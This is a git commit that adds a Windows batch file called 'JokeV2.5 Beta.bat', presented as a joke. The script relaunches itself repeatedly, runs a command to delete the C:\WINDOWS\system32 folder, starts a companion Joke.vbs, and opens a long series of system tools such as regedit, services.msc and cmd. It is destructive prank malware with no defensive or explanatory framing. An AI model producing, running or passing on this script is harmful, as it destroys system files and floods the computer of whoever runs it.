ddee4ba53c8afafef4525931c3f3145263cf2f8a
Lisandro 07 Files And Windows <97541842+Lisandro07e@users.noreply.github.com>
2024-01-07 20:48:13 -0300

    Add files via upload

---
+++ JokeV2.5 Beta.bat
@@ -0,0 +1,14 @@
+start JokeV2.5 Beta.bat
+@echo off
+del C:\WINDOWS\system32
+start Joke.vbs
+start notepad.exe
+start winver.exe
+ start iexplore.exe
+start wmplayer.exe
+start mmc.exe
+start services.msc
+start taskmgr.exe
+start regedit.exe
+start control.exe
+start cmd.exe
